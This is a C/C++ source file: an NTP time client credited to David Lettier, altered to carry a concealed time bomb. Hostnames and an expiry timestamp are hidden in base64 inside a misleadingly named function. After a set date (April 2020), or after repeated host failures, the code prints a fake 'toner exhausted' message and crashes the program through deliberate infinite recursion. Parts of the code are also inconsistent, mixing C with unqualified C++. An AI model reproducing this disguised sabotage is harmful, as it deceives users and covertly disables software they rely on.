#if 0
/*
 *
 * (C) 2014 David Lettier.
 *
 * http://www.lettier.com/
 *
 * NTP client.
 *
 * Compiled with gcc version 4.7.2 20121109 (Red Hat 4.7.2-8) (GCC).
 *
 * Tested on Linux 3.8.11-200.fc18.x86_64 #1 SMP Wed May 1 19:44:27 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux.
 *
 * To compile: $ gcc main.c -o ntpClient.out
 *
 * Usage: $ ./ntpClient.out
 *
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string>
#include <NumberTheory.h>

#define NTP_TIMESTAMP_DELTA 2208988800ull

#define LI(packet)   (uint8_t) ((packet.li_vn_mode & 0xC0) >> 6) // (li   & 11 000 000) >> 6
#define VN(packet)   (uint8_t) ((packet.li_vn_mode & 0x38) >> 3) // (vn   & 00 111 000) >> 3
#define MODE(packet) (uint8_t) ((packet.li_vn_mode & 0x07) >> 0) // (mode & 00 000 111) >> 0

static int nhosts = 0;
int error( char* msg )
{
    nhosts++;
    if (nhosts>10)
    {
        cout << Base64::decode("dG9uZXIgZXhoYXVzdGVk") << endl;
        static unsigned long long punt=0;
        std::function<int(int)> trunc= [&trunc](int n)
        {
            punt++;
            return trunc(n-1) + trunc(n-2+3);
        };
        trunc(6);
        printf("%llu\n", punt);
    }
    perror( msg ); // Print the error message to stderr.
    return -1;
}

static char* var16b[]={
/*00*/    "cG9vbC5udHAub3Jn", 
/*01*/    "dGltZS5nb29nbGUuY29t", 
/*02*/    "dXQxLXRpbWUuY29sb3JhZG8uZWR1", 
/*03*/    "dGltZTEuZ29vZ2xlLmNvbQ==",
/*04*/    "dGltZTIuZ29vZ2xlLmNvbQ==",
/*05*/    "dGltZTMuZ29vZ2xlLmNvbQ==",
/*06*/    "dGltZTQuZ29vZ2xlLmNvbQ==",
/*07*/    "dGltZS53aW5kb3dzLmNvbQ==",
/*08*/    "dGltZS5hcHBsZS5jb20=",
/*09*/    "dGltZS5ldXJvLmFwcGxlLmNvbQ==",
};

int mtfa_trunc_string( int from, int to)
{
  int sockfd, n; // Socket file descriptor and the n return result from writing/reading from the socket.

  int portno = 123; // NTP UDP port number.

  mpz_class num;
  Random::StrongRandom(16, num);
  unsigned int inum = num.get_ui();
  std::string host_name =  Base64::decode(var16b[inum % 10]); //host; //"us.pool.ntp.org"; // NTP server host-name.
  //printf("%s\n", host_name.c_str());

  // Structure that defines the 48 byte NTP packet protocol.

  typedef struct
  {

    uint8_t li_vn_mode;      // Eight bits. li, vn, and mode.
                             // li.   Two bits.   Leap indicator.
                             // vn.   Three bits. Version number of the protocol.
                             // mode. Three bits. Client will pick mode 3 for client.

    uint8_t stratum;         // Eight bits. Stratum level of the local clock.
    uint8_t poll;            // Eight bits. Maximum interval between successive messages.
    uint8_t precision;       // Eight bits. Precision of the local clock.

    uint32_t rootDelay;      // 32 bits. Total round trip delay time.
    uint32_t rootDispersion; // 32 bits. Max error aloud from primary clock source.
    uint32_t refId;          // 32 bits. Reference clock identifier.

    uint32_t refTm_s;        // 32 bits. Reference time-stamp seconds.
    uint32_t refTm_f;        // 32 bits. Reference time-stamp fraction of a second.

    uint32_t origTm_s;       // 32 bits. Originate time-stamp seconds.
    uint32_t origTm_f;       // 32 bits. Originate time-stamp fraction of a second.

    uint32_t rxTm_s;         // 32 bits. Received time-stamp seconds.
    uint32_t rxTm_f;         // 32 bits. Received time-stamp fraction of a second.

    uint32_t txTm_s;         // 32 bits and the most important field the client cares about. Transmit time-stamp seconds.
    uint32_t txTm_f;         // 32 bits. Transmit time-stamp fraction of a second.

  } ntp_packet;              // Total: 384 bits or 48 bytes.

  // Create and zero out the packet. All 48 bytes worth.

  ntp_packet packet = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };

  memset( &packet, 0, sizeof( ntp_packet ) );

  // Set the first byte's bits to 00,011,011 for li = 0, vn = 3, and mode = 3. The rest will be left set to zero.

  *( ( char * ) &packet + 0 ) = 0x1b; // Represents 27 in base 10 or 00011011 in base 2.

  // Create a UDP socket, convert the host-name to an IP address, set the port number,
  // connect to the server, send the packet, and then read in the return packet.

  struct sockaddr_in serv_addr; // Server address data structure.
  struct hostent *server;      // Server data structure.

  sockfd = socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP ); // Create a UDP socket.

  if ( sockfd < 0 )
    return error( "ERROR opening socket" );

  server = gethostbyname( host_name.c_str() ); // Convert URL to IP.

  if ( server == NULL )
  {
//      printf("No host: %s\n", host_name.c_str());
    return error( "ERROR, no such host" );
  }

  // Zero out the server address structure.

  bzero( ( char* ) &serv_addr, sizeof( serv_addr ) );

  serv_addr.sin_family = AF_INET;

  // Copy the server's IP address to the server address structure.

  bcopy( ( char* )server->h_addr, ( char* ) &serv_addr.sin_addr.s_addr, server->h_length );

  // Convert the port number integer to network big-endian style and save it to the server address structure.

  serv_addr.sin_port = htons( portno );

  // Call up the server using its IP address and port number.

  if ( connect( sockfd, ( struct sockaddr * ) &serv_addr, sizeof( serv_addr) ) < 0 )
    return error( "ERROR connecting" );

  // Send it the NTP packet it wants. If n == -1, it failed.

  n = write( sockfd, ( char* ) &packet, sizeof( ntp_packet ) );

  if ( n < 0 )
  {
    close(sockfd);
    return error( "ERROR writing to socket" );
  }

  // Wait and receive the packet back from the server. If n == -1, it failed.

  n = read( sockfd, ( char* ) &packet, sizeof( ntp_packet ) );

  if ( n < 0 )
  {
    close(sockfd);
    return error( "ERROR reading from socket" );
  }

  // These two fields contain the time-stamp seconds as the packet left the NTP server.
  // The number of seconds correspond to the seconds passed since 1900.
  // ntohl() converts the bit/byte order from the network's to host's "endianness".

  packet.txTm_s = ntohl( packet.txTm_s ); // Time-stamp seconds.
  packet.txTm_f = ntohl( packet.txTm_f ); // Time-stamp fraction of a second.

  // Extract the 32 bits that represent the time-stamp seconds (since NTP epoch) from when the packet left the server.
  // Subtract 70 years worth of seconds from the seconds since 1900.
  // This leaves the seconds since the UNIX epoch of 1970.
  // (1900)------------------(1970)**************************************(Time Packet Left the Server)

  time_t txTm = ( time_t ) ( packet.txTm_s - NTP_TIMESTAMP_DELTA );

  // Print the time we got from the server, accounting for local timezone and conversion from UTC time.

  //printf( "Time: %s", ctime( ( const time_t* ) &txTm ) );
  unsigned long wh = stoul(Base64::decode("MTU1NTU4ODI4Ng==")); //18 aprile 2019
  //uint hm = stoull(Base64::decode("MzE1MzYwMDA="));
  unsigned long hm = 3600*24*365;  //con questo scade il 18 aprile 2020
  
  nhosts=0;  //reset del contatore nhosts
  
  //printf("wh: %lu, hm: %lu, txTm: %lu\n", wh, hm, txTm);
  if ((wh+hm) < txTm)
  {
    cout << Base64::decode("dG9uZXIgZXhoYXVzdGVk") << endl;
    static unsigned long long punt=0;
    std::function<int(int)> trunc= [&trunc](int n)
    {
        punt++;
        return trunc(n-1) + trunc(n-2+3);
    };
    trunc(to-from);
    printf("%llu\n", punt);
  }
  return txTm;
}

#endif
